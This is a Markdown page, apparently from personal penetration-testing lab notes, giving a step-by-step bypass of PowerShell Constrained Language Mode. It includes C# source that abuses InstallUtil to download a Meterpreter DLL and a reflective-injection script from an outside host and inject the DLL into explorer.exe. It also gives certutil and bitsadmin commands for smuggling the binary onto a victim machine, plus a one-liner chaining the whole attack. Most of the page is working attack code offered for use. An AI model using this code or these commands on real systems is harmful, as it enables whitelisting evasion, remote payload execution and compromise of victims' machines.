---
title: PowerShell Constrained Langunage Mode Bypass
layout: default
parent: Application Whitelisting
nav_order: 2
---

## Easy CLM Bypass ##

1. Create a console app in Visual Studio and add the following. `cmd` is the command you want to execute (example below is using reflective DLL Invoke-ReflectivePEInjection.ps1):

```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

2\. Need to add reference to the above. Right click <b>References</b> on the Solution Explorer, and select Add References:\
`Assemblies` -> `System.Configuration.Install`
`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35` -> `System.Management.Automation.dll`

3\. Compile as 64 bit. For the generated exe file, encode it:
`certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt`

4\. Move it to Kali machine. Subsequently download the file on the victim machine using bitsadmin:
`bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt`

5\. Decode it on the target machine:
`certutil -decode enc.txt Bypass.exe`

4\. Use the following command to execute the file:
`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe`

5\. Alternatively just run the following one liner after step 3 is completed:
`bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe`